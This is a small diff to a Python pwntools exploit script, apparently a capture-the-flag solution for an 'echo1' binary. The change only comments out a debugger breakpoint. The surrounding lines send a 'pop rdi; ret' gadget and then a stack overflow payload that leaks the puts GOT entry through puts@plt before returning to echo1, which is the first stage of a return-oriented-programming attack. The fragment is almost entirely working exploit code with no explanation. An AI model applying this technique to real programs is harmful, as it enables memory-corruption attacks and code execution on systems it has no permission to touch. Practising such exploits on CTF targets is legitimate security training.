@@ -30,7 +30,7 @@ def DEBUG(cmd = ""):
 if __name__ == "__main__":
     pppr = asm('pop rdi;ret')
     io.sendlineafter(" : ", pppr)
-    DEBUG("b *echo1\nc")
+    #  DEBUG("b *echo1\nc")
     io.sendlineafter("> ", "1")
     payload = flat([cyclic(0x20 + 8), elf.sym['id'], elf.got['puts'], elf.plt['puts']], elf.sym['echo1'])
     io.sendline(payload)
